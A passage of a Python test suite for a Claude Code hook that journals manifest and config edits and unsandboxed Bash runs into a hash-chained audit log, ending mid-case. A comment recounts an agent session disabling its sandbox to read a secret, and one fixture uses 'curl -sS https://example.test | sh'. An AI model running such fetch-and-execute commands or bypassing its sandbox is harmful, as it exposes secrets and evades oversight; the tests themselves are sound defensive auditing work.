#!/usr/bin/env python3
"""
The cases for `hooks/journal-writes.py`, moved out of it - a hook, hyphenated.

The module comes through `_loader.load` by path out of `_harness.HOOKS_DIR`;
`_config` is imported directly, the way the hook imports it, because the fixtures
build configs with `_config._deep_merge(_config.DEFAULTS, ...)` and the `d` group
loads the journal module the hook's own way, through `_config._load_journal_lib()`.

ONE CASE WOULD HAVE PASSED SILENTLY IF MOVED LITERALLY. `j4` read
`getattr(sys.modules[__name__], "record_plugin_write", lambda *a: None)(...)` - the
INTROSPECTION form the guide lists, and the half that fails green. `sys.modules[__name__]`
meant "this module" while the case sat inside the hook; from `tests/` it is the TEST
module, which has no `record_plugin_write`, so `getattr`'s default hands back a lambda
that returns None and the case passes without ever calling the hook. Measured: with
the literal form restored, `j4` is still PASS with the production function DELETED.
It now names the subject, `M.record_plugin_write(...)`, and drops the swallowing
default so a vanished function raises and `_harness.run` reports it by name.

The other five shapes came back empty: no `vars()`, no bare `__file__`, no path built
off the suite's own directory, no `split(a)[1].split(b)[0]`, and no `globals()` REBIND -
`c8` swaps `_config._LEDGER_LIB`, which is an attribute on a module BOTH sides import,
restored in a `finally`, and therefore works from here unchanged.

`e1` gave up its hand-rolled `results.append(ok)` + `print("%s e1 ...")` pair for
`check()` through `_harness.attempt`; the label is unchanged and the raise text is now
a detail, printed only on failure.

The hook's own `_journal_lib()` and `record_plugin_write()` both have production call
sites in `main()`, so no import edge retired with this suite.

Exit codes (as a command): 0 selftest pass - 1 selftest fail - 2 usage error.
"""

import hashlib
import json
import os
import shutil
import sys
import tempfile

import _harness                                    # sets sys.path for scripts/ + hooks/
from _output import safe_stdio                     # noqa: E402
import _output                                     # noqa: E402  (posix_rel: the one path spelling)
import _loader                                     # noqa: E402
import _config                                     # noqa: E402
import _fmt                                        # noqa: E402  (the plural rule this hook must copy)
import _journal_io                                 # noqa: E402  (the details allow-list + its bounds)

M = _loader.load(os.path.join(_harness.HOOKS_DIR, "journal-writes.py"),
                 modname="journal_writes")


# --- cases --------------------------------------------------------------------
def _cases(check):
    tmp = tempfile.mkdtemp(prefix="journal-writes-selftest-")
    prev_env = os.environ.get("CLAUDE_PROJECT_DIR")
    os.environ["CLAUDE_PROJECT_DIR"] = tmp
    cfg = _config._deep_merge(_config.DEFAULTS, {})

    def payload(tool, path, *, sid="sess-1", edits=None):
        if tool == "NotebookEdit":
            ti = {"notebook_path": path, "new_source": "x"}
        elif tool == "MultiEdit":
            ti = {"file_path": path, "edits": edits or [{}, {}]}
        else:
            ti = {"file_path": path, "content": "x"}
        return {"tool_name": tool, "tool_input": ti, "session_id": sid,
                "cwd": tmp}

    def verdict(tool, path, *, use_cfg=None, **kw):
        try:
            return M.decide(payload(tool, path, **kw), cfg=use_cfg or cfg,
                            root=tmp)
        except Exception as exc:                       # pragma: no cover
            return ("EXC", str(exc))

    try:
        # --- what is recorded -------------------------------------------------
        v, e = verdict("Edit", "docs/audit/audit-plan.json")
        check("a1 an edit to the manifest index is journalled",
              v == "journal" and e["action"] == "manifest.edit"
              and e["target"] == "docs/audit/audit-plan.json", repr((v, e)))
        v, e = verdict("Write", "docs/audit/phases/P3.json")
        check("a2 a phase shard is the manifest too - under the sharded layout "
              "almost every write IS a shard, and only the index has that name",
              v == "journal" and e["action"] == "manifest.edit"
              and e["target"] == "docs/audit/phases/P3.json", repr((v, e)))
        v, e = verdict("Edit", ".claude/audit.config.json")
        check("a3 the config is journalled under its own action - the rules "
              "changing is a different event from the plan changing",
              v == "journal" and e["action"] == "config.edit", repr((v, e)))
        v, e = verdict("Edit", os.path.join(tmp, "docs", "audit", "audit-plan.json"))
        check("a4 an ABSOLUTE path is recognised and recorded repo-relative "
              "(the tool reports absolute paths)",
              v == "journal" and e["target"] == "docs/audit/audit-plan.json",
              repr((v, e)))
        v, e = verdict("NotebookEdit", "docs/audit/audit-plan.json")
        check("a5 a notebook edit reads its own path key", v == "journal")

        # --- what is not ------------------------------------------------------
        for path, why in ((".claude/audit.config.json.bak", "a backup is not the config"),
                          ("src/app.py", "ordinary source"),
                          ("docs/audit/notes.md", "a sibling of the manifest"),
                          ("docs/audit/phases/notes.txt", "not a shard"),
                          ("docs/audit/audit-plan.json.lock", "the lock file")):
            v, _ = verdict("Write", path)
            check("b %s is not journalled (%s)" % (path, why), v == "skip")
        v, _ = verdict("Bash", "docs/audit/audit-plan.json")
        check("b6 a non-edit tool is not this hook's business", v == "skip")
        v, _ = verdict("Edit", "")
        check("b7 a payload with no path is skipped, not guessed at", v == "skip")
        v, r = verdict("Edit", "docs/audit/journal/2026-08.a.jsonl")
        check("b8 the journal is never its own subject", v == "skip"
              and "not its own subject" in r)
        v, _ = verdict("Edit", "docs/audit/audit-plan.json", use_cfg=_config._deep_merge(
            cfg, {"journal": {"enabled": False}}))
        check("b9 a disabled journal records nothing", v == "skip")
        # A moved manifest takes its shards and its journal with it.
        moved = _config._deep_merge(cfg, {"manifestPath": "plan/audit.json"})
        v, e = verdict("Edit", "plan/phases/P1.json", use_cfg=moved)
        check("b10 a shard of a MOVED manifest is still the manifest",
              v == "journal" and e["action"] == "manifest.edit")
        v, _ = verdict("Edit", "docs/audit/audit-plan.json", use_cfg=moved)
        check("b11 ...and the old location stops being special", v == "skip")

        # --- what the row says ------------------------------------------------
        v, e = verdict("MultiEdit", "docs/audit/audit-plan.json",
                       edits=[{}, {}, {}])
        check("c1 a MultiEdit says how many edits it was - 'MultiEdit' alone hides "
              "how much moved", "MultiEdit (3 edits)" in e["summary"], e["summary"])
        check("c2 one edit is not pluralised",
              "(1 edit)" in M.decide(
                  payload("MultiEdit", "docs/audit/audit-plan.json",
                          edits=[{}]), cfg=cfg, root=tmp)[1]["summary"])
        # The one copy of the pluralisation rule that cannot be removed: hooks
        # may import nothing from `scripts/`, so `_how` spells `n == 1` itself
        # while `_fmt.plural` owns it for everyone else. Held by EXERCISING both
        # over a range that crosses the boundary in both directions - the same
        # shape as `find_script()`'s third copy, which is read rather than
        # merged. A single value would agree by luck: 1 agrees with a
        # never-suffix rule and 3 agrees with an always-suffix one.
        _dis = [(n, M._how("MultiEdit", {"edits": [{}] * n}),
                 "MultiEdit (%s)" % _fmt.plural(n, "edit"))
                for n in (0, 1, 2, 3, 11)]
        check("c2b the hook's forced COPY of the plural rule still agrees with "
              "`_fmt.plural` at every n it was checked at, 0 and 1 included "
              "(disagreements: %r)"
              % ([(n, a, b) for n, a, b in _dis if a != b],),
              len(_dis) == 5 and all(a == b for _n, a, b in _dis))
        check("c3 the row carries only the news, never the chain fields that "
              "audit-journal.py owns",
              set(e) == {"action", "target", "summary", "actor"}, repr(sorted(e)))
        check("c4 the actor names the session and how the write arrived",
              e["actor"]["sessionId"] == "sess-1" and e["actor"]["via"] == "hook")
        v, e = verdict("Edit", "docs/audit/audit-plan.json", sid="")
        check("c5 a payload with no session id still produces a row",
              v == "journal" and e["actor"]["sessionId"] is None)
        _none = _config._deep_merge(cfg, {"usage": {"authorMode": "none"}})
        v, e = verdict("Edit", "docs/audit/audit-plan.json", use_cfg=_none)
        check("c6 authorMode none is honoured here too - a project that refuses to "
              "record who spends must not have it recorded here instead",
              v == "journal" and e["actor"]["author"] is None, repr(e["actor"]))
        # F-B2: the ledger module behind _author loads through _config's cache.
        # Honest accounting: production calls _author once per hook process, so
        # the cache is a selftest/parity win (suites drive it dozens of times,
        # each uncached call re-executing a ~1800-line module) - plus the same
        # single-module identity _journal_lib and _areas_lib already have.
        _llib_fn = getattr(_config, "_ledger_lib", None)
        _llib = _llib_fn() if _llib_fn else None
        check("c7 _config caches the ledger module - the same object across "
              "two calls, and _author's answer is resolve_author's answer",
              _llib is not None and _llib is _llib_fn()
              and M._author(tmp, cfg) == _llib.resolve_author(str(tmp), "email"))
        _saved_lib = dict(getattr(_config, "_LEDGER_LIB", None) or {})

        class _StubLedger:
            @staticmethod
            def resolve_author(_root, mode):
                return "stub-author:" + mode

        try:
            if hasattr(_config, "_LEDGER_LIB"):
                _config._LEDGER_LIB.update({"tried": True, "mod": _StubLedger})
            check("c8 _author reads THROUGH the cache - swap the cached module "
                  "and the answer follows it",
                  M._author(tmp, cfg) == "stub-author:email")
        finally:
            if hasattr(_config, "_LEDGER_LIB"):
                _config._LEDGER_LIB.clear()
                _config._LEDGER_LIB.update(_saved_lib)

        # --- end to end: the hook actually writes a verifiable chain -----------
        # decide() alone proves the decision, not the wiring. Two writes go all the
        # way through the real module, and the chain is then verified.
        proj = os.path.join(tmp, "e2e")
        os.makedirs(os.path.join(proj, "docs", "audit"))
        with open(os.path.join(proj, "docs", "audit", "audit-plan.json"), "w",
                  encoding="utf-8") as fh:
            fh.write('{"meta":{"version":3}}')
        jmod = _config._load_journal_lib()
        check("d0 the journal module loads from the hooks side at all",
              jmod is not None)
        for i in range(2):
            v, e = M.decide(payload("Edit", "docs/audit/audit-plan.json",
                                    sid="e2e-%d" % i), cfg=cfg, root=proj)
            if v == "journal":
                jmod.append(proj, e)
        res = jmod.verify(proj)
        check("d1 two writes leave two rows, in two files - one per session, which "
              "is what keeps parallel worktrees conflict-free",
              res["rows"] == 2 and len(res["files"]) == 2, repr(res))
        check("d2 and the chain verifies", res["ok"] and not res["findings"],
              repr(res["findings"]))
        rows = jmod.read_all(proj)
        check("d3 the row records the manifest as it stood after the write, so a "
              "later change with no row to explain it is visible",
              all(r.get("stateHash") for r in rows), repr(rows))
        with open(os.path.join(proj, "docs", "audit", "audit-plan.json"), "w",
                  encoding="utf-8") as fh:
            fh.write('{"meta":{"version":3},"phases":[]}')
        check("d4 ...and it is: an out-of-band edit warns, without accusing",
              jmod.verify(proj)["ok"]
              and any("never saw" in w for w in jmod.verify(proj)["warnings"]))

        # --- failure is silent, always ---------------------------------------
        # A recorder that raises into a PostToolUse hook is a recorder that breaks
        # the write it was recording.
        _e1_ok, _bad = _harness.attempt(
            M.decide, {"tool_name": "Edit", "tool_input": None}, cfg=cfg,
            root=tmp)
        check("e1 a malformed payload is skipped, never raised",
              _e1_ok and _bad[0] == "skip", "" if _e1_ok else _bad)
        # Driven through main() rather than read off the source: this is the whole
        # stdin-to-exit contract, and the one thing it must not do is speak.
        import io
        _stdin, _stdout = sys.stdin, sys.stdout
        _cap = io.StringIO()
        _code = None
        try:
            sys.stdin = io.StringIO(json.dumps(
                {"tool_name": "Edit", "session_id": "e2",
                 "tool_input": {"file_path": "docs/audit/audit-plan.json",
                                "new_string": "x"},
                 "cwd": proj}))
            sys.stdout = _cap
            os.environ["CLAUDE_PROJECT_DIR"] = proj
            try:
                M.main()
            except SystemExit as exc:
                _code = exc.code
        finally:
            sys.stdin, sys.stdout = _stdin, _stdout
            os.environ["CLAUDE_PROJECT_DIR"] = tmp
        check("e2 the hook exits 0 and prints NOTHING - a recorder that talks "
              "turns every manifest edit into a line of transcript nobody asked "
              "for", _code in (0, None) and _cap.getvalue() == "",
              repr((_code, _cap.getvalue()[:120])))
        check("e3 ...and it really did record that write - a hook that stays quiet "
              "by doing nothing would pass the case above",
              jmod.verify(proj)["rows"] == 3, repr(jmod.verify(proj)))

        # --- g: the Pre pass caches the pre-image ------------------------------
        # Edit fragments are not parseable JSON, so the only way to diff is to
        # remember the file as it stood BEFORE the write.
        pproj = os.path.join(tmp, "prepost")
        os.makedirs(os.path.join(pproj, "docs", "audit"))
        man_rel = "docs/audit/audit-plan.json"
        man_abs = os.path.join(pproj, man_rel)

        def write_manifest(obj):
            with open(man_abs, "w", encoding="utf-8") as fh:
                json.dump(obj, fh)

        def manifest_doc(status="in_progress", commit=None, completed=None,
                         phase_status="in_progress", merged=None):
            return {"meta": {"version": 2}, "phases": [
                {"id": "P1", "title": "p", "status": phase_status,
                 "mergedAt": merged,
                 "tasks": [{"id": "P1.1", "title": "t", "status": status,
                            "commit": commit, "completedAt": completed}]}]}

        write_manifest(manifest_doc())
        slot = M.pre_cache(payload("Edit", man_rel, sid="pp-1"), cfg=cfg,
                           root=pproj)
        check("g1 the Pre pass caches a manifest target and returns the slot",
              slot is not None and os.path.exists(slot), repr(slot))
        with open(slot, encoding="utf-8") as fh:
            slot_obj = json.load(fh)
        check("g2 the slot holds the path, a hash and the bytes themselves",
              slot_obj.get("path") == man_rel
              and str(slot_obj.get("sha256") or "").startswith("sha256:")
              and json.loads(slot_obj["content"])["phases"][0]["id"] == "P1",
              repr(slot_obj)[:200])
        check("g3 an ordinary source file leaves no slot",
              M.pre_cache(payload("Edit", "src/app.py", sid="pp-1"), cfg=cfg,
                          root=pproj) is None)
        check("g4 a disabled journal caches nothing (the Pre pass reads the "
              "pre-image config: on Pre, disk IS the pre-image)",
              M.pre_cache(payload("Edit", man_rel, sid="pp-1"),
                          cfg=_config._deep_merge(cfg, {"journal":
                                                        {"enabled": False}}),
                          root=pproj) is None)
        write_manifest(manifest_doc(status="pending"))
        M.pre_cache(payload("Edit", man_rel, sid="pp-1"), cfg=cfg, root=pproj)
        with open(slot, encoding="utf-8") as fh:
            slot_obj2 = json.load(fh)
        check("g5 a second Pre OVERWRITES the stale slot - a denied tool call "
              "self-heals on the next attempt",
              json.loads(slot_obj2["content"])
              ["phases"][0]["tasks"][0]["status"] == "pending")
        os.makedirs(os.path.join(pproj, "docs", "audit", "phases"),
                    exist_ok=True)
        big_rel = "docs/audit/phases/P9.json"
        with open(os.path.join(pproj, big_rel), "w", encoding="utf-8") as fh:
            fh.write('{"id":"P9","tasks":[],"pad":"'
                     + "x" * (5 * 1024 * 1024) + '"}')
        slot_big = M.pre_cache(payload("Edit", big_rel, sid="pp-1"), cfg=cfg,
                               root=pproj)
        with open(slot_big, encoding="utf-8") as fh:
            check("g6 a pre-image over the 5 MB cap is not cached whole - the "
                  "slot records the miss and the Post pass falls back",
                  json.load(fh).get("content") is None)

        # --- h: the Post pass diffs, summarises, and derives events ------------
        write_manifest(manifest_doc(status="in_progress"))
        M.pre_cache(payload("Edit", man_rel, sid="pp-2"), cfg=cfg, root=pproj)
        write_manifest(manifest_doc(status="done",
                                    completed="2026-08-11T00:00:00Z"))
        entries = M.post_entries(payload("Edit", man_rel, sid="pp-2"), cfg=cfg,
                                 root=pproj)
        check("h1 a status flip yields a semantic summary, not 'Edit wrote ...'",
              len(entries) >= 1
              and "P1.1: status in_progress->done" in entries[0]["summary"]
              and "completedAt set" in entries[0]["summary"],
              repr([e.get("summary") for e in entries]))
        check("h2 ...with the structured changes in details",
              {"id": "P1.1", "field": "status", "from": "in_progress",
               "to": "done"} in (entries[0].get("details") or {})
              .get("changes", []), repr(entries[0].get("details")))
        comp = [e for e in entries if e.get("action") == "task.complete"]
        check("h3 ...and a task.complete row derived from the same diff - the "
              "HOOK is the only writer of these",
              len(comp) == 1 and comp[0]["details"] == {
                  "taskId": "P1.1", "phaseId": "P1", "from": "in_progress",
                  "to": "done", "completedAt": "2026-08-11T00:00:00Z"},
              repr(comp))
        # F194 REVERSED THIS CASE, and the reversal is the fix. It used to assert
        # the Post pass DELETED the slot, which made the pre-image a one-shot
        # belonging to the Pre pass that wrote it - and a Pre pass runs only for an
        # edit tool, so the session's next write kept its derived rows only if it
        # too arrived through one. Asserted on the CONTENT and not merely on
        # existence: a refresh that wrote the file back unchanged would leave the
        # next write diffing against a state two writes old, which passes an
        # exists() check for ever.
        _h4_slot = M._slot_path(pproj, cfg, {"session_id": "pp-2"}, man_rel)
        try:
            with open(_h4_slot, encoding="utf-8") as fh:
                _h4_obj = json.load(fh)
        except Exception:
            _h4_obj = {}
        _h4_doc = M._parse_preimage(_h4_obj)
        check("h4 the Post pass REFRESHES the slot to the state it just recorded "
              "- the baseline is the manifest as of the last ROW, not as of the "
              "last edit-tool Pre pass, which is what lets any writer's next "
              "change be diffed",
              os.path.exists(_h4_slot)
              and isinstance(_h4_doc, dict)
              and _h4_doc["phases"][0]["tasks"][0]["status"] == "done"
              and _h4_obj.get("sha256") == M._snapshot(man_abs)[0],
              repr(_h4_obj)[:220])

        write_manifest(manifest_doc(status="done", completed="X"))
        M.pre_cache(payload("Write", man_rel, sid="pp-3"), cfg=cfg, root=pproj)
        write_manifest(manifest_doc(status="done", completed="X",
                                    commit="a" * 40))
        entries = M.post_entries(payload("Write", man_rel, sid="pp-3"), cfg=cfg,
                                 root=pproj)
        commit_rows = [e for e in entries if e.get("action") == "task.commit"]
        check("h5 a Write is diffed by full content: commit null->SHA yields a "
              "task.commit row",
              len(commit_rows) == 1
              and commit_rows[0]["details"]["commit"] == "a" * 40
              and commit_rows[0]["details"]["taskId"] == "P1.1", repr(entries))
        check("h5b ...and no task.complete - the status did not move this time",
              not [e for e in entries if e.get("action") == "task.complete"])

        write_manifest(manifest_doc(status="done", completed="X",
                                    commit="a" * 40))
        M.pre_cache(payload("Edit", man_rel, sid="pp-4"), cfg=cfg, root=pproj)
        write_manifest(manifest_doc(status="done", completed="X",
                                    commit="a" * 40, phase_status="done",
                                    merged="2026-08-11T01:00:00Z"))
        entries = M.post_entries(payload("Edit", man_rel, sid="pp-4"), cfg=cfg,
                                 root=pproj)
        sign = [e for e in entries if e.get("action") == "phase.signoff"]
        check("h6 a phase flipped to done yields a phase.signoff row carrying "
              "mergedAt",
              len(sign) == 1 and sign[0]["details"] == {
                  "phaseId": "P1", "from": "in_progress", "to": "done",
                  "mergedAt": "2026-08-11T01:00:00Z"}, repr(sign))

        # --- i: connector v2 events (task.blocked + ado.link) ------------------
        # Derived from the same diff as everything else, tested on the core
        # directly. D-1 rule: `ado` is NOT in TASK_FIELDS - only the id is
        # compared, so an echo's lastSyncedAt bump writes no row at all.
        i_base = manifest_doc(status="in_progress")
        i_blocked = manifest_doc(status="blocked")
        i_blocked["phases"][0]["tasks"][0]["attempts"] = 3
        d_i1 = M.semantic_diff(i_base, i_blocked)
        blk = [e for e in (d_i1 or {}).get("events", [])
               if e.get("action") == "task.blocked"]
        check("i1 a task entering blocked yields a task.blocked row - "
              "symmetric with task.complete",
              len(blk) == 1 and blk[0]["details"] == {
                  "taskId": "P1.1", "phaseId": "P1",
                  "from": "in_progress", "attempts": 3},
              repr(d_i1 and d_i1.get("events")))
        d_i2 = M.semantic_diff(i_blocked, i_base)
        check("i2 LEAVING blocked is a change row only, never a task.blocked "
              "event",
              d_i2 is not None and not [e for e in d_i2.get("events", [])
                                        if e.get("action") == "task.blocked"])
        i_linked = manifest_doc(status="in_progress")
        i_linked["phases"][0]["tasks"][0]["ado"] = {
            "id": 7, "url": "u", "lastSyncedAt": "t1"}
        d_i3 = M.semantic_diff(i_base, i_linked)
        link_rows = [e for e in (d_i3 or {}).get("events", [])
                     if e.get("action") == "ado.link"]
        check("i3 a task link (ado.id None->int) yields an ado.link row and "
              "an ado.id change row",
              len(link_rows) == 1 and link_rows[0]["details"] == {
                  "taskId": "P1.1", "phaseId": "P1", "adoId": 7}
              and any(c.get("field") == "ado.id" for c in d_i3["changes"]),
              repr(d_i3))
        i_bumped = json.loads(json.dumps(i_linked))
        i_bumped["phases"][0]["tasks"][0]["ado"]["lastSyncedAt"] = "t2"
        check("i4 a lastSyncedAt-only bump is NO row at all - the plan did "
              "not move, and the echo must not spam the journal",
              M.semantic_diff(i_linked, i_bumped) is None)
        i_ph = manifest_doc(status="in_progress")
        i_ph["phases"][0]["ado"] = {"id": 9, "url": "u", "lastSyncedAt": "t"}
        d_i5 = M.semantic_diff(i_base, i_ph)
        ph_rows = [e for e in (d_i5 or {}).get("events", [])
                   if e.get("action") == "ado.link"]
        check("i5 a phase PBI link yields an ado.link row too",
              len(ph_rows) == 1 and ph_rows[0]["details"] == {
                  "phaseId": "P1", "adoId": 9}, repr(d_i5))
        i_garbage = manifest_doc(status="in_progress")
        i_garbage["phases"][0]["tasks"][0]["ado"] = "WI-7"
        check("i6 a non-dict ado never crashes the diff and never links",
              M.semantic_diff(i_base, i_garbage) is None)

        write_manifest(manifest_doc())
        entries = M.post_entries(payload("Edit", man_rel, sid="pp-5"), cfg=cfg,
                                 root=pproj)
        check("h7 a cache miss falls back to the generic summary AND SAYS SO - "
              "F194: a bare `Edit wrote <path>` row was indistinguishable from a "
              "write where nothing this hook tracks had moved, so the derived "
              "rows went missing in a shape no reader could act on",
              len(entries) == 1
              and entries[0]["summary"].startswith("Edit wrote ")
              and M.DERIVATION_MISSED in entries[0]["summary"]
              and (entries[0].get("details") or {}).get("reason")
              == M.DERIVATION_MISSED
              and not [e for e in entries if e.get("action") != "manifest.edit"],
              repr(entries))
        # THE SECOND-DIRECTION CASE for h7, and it looks vacuous on purpose: a
        # stated gap that is stated unconditionally is worse than silence, because
        # it would appear on the rows that DID derive their completion records and
        # teach a reader to ignore it. h1-h3 above already own the successful
        # diff; this owns the absence of the marker on it.
        M.pre_cache(payload("Edit", man_rel, sid="pp-5b"), cfg=cfg, root=pproj)
        write_manifest(manifest_doc(status="done", completed="Z"))
        _h7b = M.post_entries(payload("Edit", man_rel, sid="pp-5b"), cfg=cfg,
                              root=pproj)
        check("h7b ...and a write that WAS derived carries no such marker - the "
              "mutation this catches is a gap statement that fires always",
              len(_h7b) == 2
              and M.DERIVATION_MISSED not in _h7b[0]["summary"]
              and "reason" not in (_h7b[0].get("details") or {})
              and _h7b[1]["action"] == "task.complete", repr(_h7b))
        slot2 = M.pre_cache(payload("Edit", man_rel, sid="pp-6"), cfg=cfg,
                            root=pproj)
        with open(slot2, "w", encoding="utf-8") as fh:
            json.dump({"path": man_rel, "ts": "t", "sha256": "sha256:x",
                       "content": "{not json"}, fh)
        entries = M.post_entries(payload("Edit", man_rel, sid="pp-6"), cfg=cfg,
                                 root=pproj)
        check("h8 an unparseable pre-image falls back to the generic summary",
              len(entries) == 1
              and entries[0]["summary"].startswith("Edit wrote "))
        slot3 = M.pre_cache(payload("Edit", man_rel, sid="pp-7"), cfg=cfg,
                            root=pproj)
        with open(slot3, "w", encoding="utf-8") as fh:
            json.dump({"path": man_rel, "ts": "t", "sha256": None,
                       "content": None}, fh)
        entries = M.post_entries(payload("Edit", man_rel, sid="pp-7"), cfg=cfg,
                                 root=pproj)
        check("h9 an over-the-cap pre-image falls back too",
              len(entries) == 1
              and entries[0]["summary"].startswith("Edit wrote "))

        # --- k: the disable loophole, closed -----------------------------------
        # journal.enabled is judged against the PRE-IMAGE when the config itself
        # is the target, so the flip that would have silenced its own record is
        # written down as a final row - the last will.
        cfg_rel = _config.CONFIG_REL
        cfg_abs = os.path.join(pproj, cfg_rel)
        os.makedirs(os.path.dirname(cfg_abs), exist_ok=True)

        def write_cfg_file(obj):
            with open(cfg_abs, "w", encoding="utf-8") as fh:
                json.dump(obj, fh)

        write_cfg_file({"journal": {"enabled": True}})
        M.pre_cache(payload("Edit", cfg_rel, sid="pp-9"), cfg=cfg, root=pproj)
        write_cfg_file({"journal": {"enabled": False}})
        post_cfg = _config._deep_merge(cfg, {"journal": {"enabled": False}})
        entries = M.post_entries(payload("Edit", cfg_rel, sid="pp-9"),
                                 cfg=post_cfg, root=pproj)
        check("k1 flipping journal.enabled true->false IS journalled, with the "
              "flip in details",
              len(entries) == 1 and entries[0]["action"] == "config.edit"
              and (entries[0].get("details") or {}).get("changes") ==
              [{"field": "journal.enabled", "from": True, "to": False}]
              and "journal.enabled" in entries[0]["summary"], repr(entries))
        write_cfg_file({"journal": {"enabled": False}})
        check("k2 a config edit while the journal was already off records "
              "nothing - the user's switch is honoured",
              M.pre_cache(payload("Edit", cfg_rel, sid="pp-10"), cfg=post_cfg,
                          root=pproj) is None
              and M.post_entries(payload("Edit", cfg_rel, sid="pp-10"),
                                 cfg=post_cfg, root=pproj) == [])
        write_cfg_file({"journal": {"enabled": True}})
        entries = M.post_entries(payload("Edit", cfg_rel, sid="pp-11"), cfg=cfg,
                                 root=pproj)
        check("k3 flipping it back ON is recorded (generically - there was no "
              "pre-image while it was off)",
              len(entries) == 1 and entries[0]["action"] == "config.edit")

        # --- s: P0-S, the unsandboxed Bash run ---------------------------------
        # `dangerouslyDisableSandbox: true` turns off the ONLY layer that can
        # actually contain a read, and until P0-S no part of this plugin saw it:
        # a live session read a secret through direnv that way and left no deny,
        # no gate message and NO ROW. This stops nothing - PostToolUse is after
        # the fact - it converts an invisible event into tamper-evident history,
        # which is the currency this plugin actually trades in.
        def bash_payload(cmd, *, sid="pp-s", sandbox_off=True):
            ti = {"command": cmd}
            if sandbox_off is not None:
                ti["dangerouslyDisableSandbox"] = sandbox_off
            return {"tool_name": "Bash", "tool_input": ti, "session_id": sid,
                    "cwd": pproj}

        entries = M.post_entries(bash_payload("pnpm test --filter api"),
                                 cfg=cfg, root=pproj)
        # THIS HOOK STILL HANDS OVER THE RAW COMMAND, and s7 is where that stops
        # being true of the ROW. The comment below - "an entry dict is a decision,
        # not evidence" - used to explain why s6/s7 existed at all; here it is the
        # thing under test. The redaction lives at `_journal_io`'s hash boundary,
        # which every writer goes through, rather than in each writer: a rule
        # spelled once in a shared seam covers the panel, `audit-task.py` and the
        # CLI, and no second hook grows `hashlib` on the critical path of every
        # tool call. A hook that pre-redacted would ALSO pass s7 while leaving the
        # other three writers leaking.
        check("s1 the hook hands the raw command and the raw cwd to the journal - "
              "an entry dict is a decision, not evidence, and the boundary is what "
              "redacts",
              len(entries) == 1
              and entries[0]["action"] == "bash.unsandboxed"
              and (entries[0].get("details") or {}).get("command")
              == "pnpm test --filter api"
              and (entries[0].get("details") or {}).get("cwd") == pproj,
              repr(entries))
        # s2 IS THE SECOND-DIRECTION MUTATION and it is the whole reason the
        # branch reads the flag instead of the tool name. A recorder that logged
        # every Bash call would pass s1 forever and turn the journal - the plan's
        # audit trail - into a shell history. It looks vacuous; it is the only
        # case that fails if the condition becomes unconditional.
        check("s2 an ordinary sandboxed Bash run records NOTHING - the journal "
              "is the audit trail of the plan, not a shell log",
              M.post_entries(bash_payload("pnpm test", sandbox_off=None),
                             cfg=cfg, root=pproj) == []
              and M.post_entries(bash_payload("pnpm test", sandbox_off=False),
                                 cfg=cfg, root=pproj) == [])
        check("s3 the string form of the flag counts too - a payload is not this "
              "hook's to validate, and `is True` would grade \"true\" as safe",
              len(M.post_entries(bash_payload("ls", sandbox_off="true"),
                                 cfg=cfg, root=pproj)) == 1)
        check("s4 the user's switch still wins - journal.enabled false records "
              "nothing here either",
              M.post_entries(bash_payload("ls"), cfg=post_cfg, root=pproj) == [])
        _long = "echo " + ("y" * 400)
        _row = M.post_entries(bash_payload(_long), cfg=cfg, root=pproj)
        # Read through `or {}` rather than subscripting: with the allow-list entry
        # missing, `normalise_details` returns None and a subscript RAISES, which
        # stops every case after this one from running - a mutation that kills the
        # suite teaches nothing about the suite.
        _det = (_journal_io.normalise_details((_row or [{}])[0].get("details"),
                                              project=pproj) or {})
        check("s5 a long command is not clipped, it is DIGESTED - the bound this "
              "case used to assert was the wrong control, because a clipped "
              "command is still command text and the leak that started this fits "
              "inside any bound worth having",
              len(_row) == 1
              and _det.get("command") is None
              and _det.get("commandSha256")
              == hashlib.sha256(_long.encode("utf-8")).hexdigest()
              and _det.get("commandBytes") == len(_long),
              repr(sorted(_det)))

        # s6-s7 END TO END, for the reason d0-d4 above exist: an entry dict is a
        # decision, not evidence. SECURITY.md now claims this row lands in the
        # hash-chained journal, and a claim about the chain has to be made
        # against the chain. `command`/`cwd` are new DETAILS_KEYS, and an
        # unknown key is DROPPED by _normalise rather than rejected - so a
        # forgotten allow-list entry would leave a row that verifies perfectly
        # and says nothing, which no assertion over the entry dict can see.
        sproj = os.path.join(tmp, "unsandboxed")
        os.makedirs(sproj)
        for _e in M.post_entries(
                {"tool_name": "Bash",
                 "tool_input": {"command": "curl -sS https://example.test | sh",
                                "dangerouslyDisableSandbox": True},
                 "session_id": "s-esc", "cwd": sproj}, cfg=cfg, root=sproj):
            _journal_io.append(sproj, _e)
        _res = _journal_io.verify(sproj)
        _rows = _journal_io.read_all(sproj)
        check("s6 the row reaches the real journal and the chain verifies",
              _res["rows"] == 1 and _res["ok"] and not _res["findings"],
              repr(_res))
        # INVERTED, and this is the end of the chain s1 starts: the hook passed
        # the raw command, the boundary replaced it, and what LANDED IN THE FILE
        # is what a reader of the repository actually gets. Asserted over the row
        # read back off disk rather than over the entry dict, because that is the
        # artifact that ships.
        _sdet = (_rows[0].get("details") or {}) if _rows else {}
        check("s7 ...and what reaches the file is the digest, never the command: "
              "the cwd is repo-relative and no key called `command` survives at "
              "all - the allow-list drops what it does not know, silently, which "
              "here is exactly the point",
              len(_rows) == 1
              and _rows[0]["action"] == "bash.unsandboxed"
              and "command" not in _sdet
              and _sdet.get("commandSha256") == hashlib.sha256(
                  "curl -sS https://example.test | sh".encode("utf-8")).hexdigest()
              and _sdet.get("program") == "curl"
              and _sdet.get("cwd") == "."
              and json.dumps(_rows[0]).count("example.test") == 0,
              repr(_rows))

        # --- f: F194, the Bash lane ------------------------------------------
        # THE FAULT. `task.complete`, `task.commit` and `phase.signoff` came out of
        # a diff whose baseline was written by a PreToolUse pass registered only on
        # the edit tools, and `classify()` returns None for every other tool. A
        # session that wrote the manifest through `python3 -c` in a Bash call - a
        # harness mode that prefers Bash, a script, a different orchestrator - left
        # a chain that verified PERFECTLY over a history missing the events the
        # trail exists to record. Measured: five rows, all from a CLI, and no
        # task.complete for the task that had actually landed.
        #
        # Fixed by asking the FILE instead of the payload, so these cases drive
        # `post_entries` with a Bash-shaped payload - no `file_path` anywhere in it -
        # and the file is moved between calls by this suite, exactly as a shell
        # command would move it.
        fproj = os.path.join(tmp, "f194")
        os.makedirs(os.path.join(fproj, "docs", "audit", "phases"))
        f_man_abs = os.path.join(fproj, man_rel)
        f_cfg_abs = os.path.join(fproj, _config.CONFIG_REL)

        def f_write(obj, path=None):
            target = path or f_man_abs
            _config.ensure_local_dir(os.path.dirname(target))
            with open(target, "w", encoding="utf-8") as fh:
                json.dump(obj, fh)

